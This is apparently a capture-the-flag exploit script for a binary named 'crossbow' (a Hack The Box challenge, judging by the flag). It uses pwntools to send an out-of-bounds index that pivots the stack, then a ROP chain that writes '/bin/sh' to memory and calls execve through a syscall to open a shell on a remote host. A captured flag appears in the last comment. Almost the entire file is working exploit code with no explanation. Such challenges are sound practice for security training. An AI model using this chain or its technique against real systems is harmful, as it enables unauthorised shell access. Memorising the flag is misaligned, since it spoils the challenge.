from pwn import *

e = ELF("./crossbow")

'''
target_dummy
scanf
calloc
leave of target_dummy
'''

script = '''
b *target_dummy
b *0x401218
b *0x40127D
b *0x40136C
'''

p = remote("94.237.55.61", 40536)
#p = process("./crossbow")
#p = gdb.debug("./crossbow", gdbscript = script)

# aim for saved rbp of target_dummy (stack pivot)
p.sendlineafter(b"shoot: ", f"{-2}".encode())

# perform ROP
pop_rdi = 0x0000000000401d6c
pop_rsi = 0x000000000040566b
pop_rdx = 0x0000000000401139
pop_rax = 0x0000000000401001
syscall = 0x00000000004015d3
mov_qword_ptr_rdi_rax = 0x00000000004020f5
rw_section = 0x40d840

rop = [p64(0), p64(pop_rdi),
p64(rw_section), p64(pop_rax),
b"/bin/sh\x00", p64(mov_qword_ptr_rdi_rax),
p64(pop_rsi), p64(0),
p64(pop_rdx), p64(0),
p64(pop_rax), p64(59),
p64(syscall)]

payload = b"".join(rop)
p.sendlineafter(b"warcry!!\n\n> ", payload)

p.interactive()
#HTB{st4t1c_b1n4r13s_ar3_2_3z_295e4d79db34d5aded03f55a21176e73}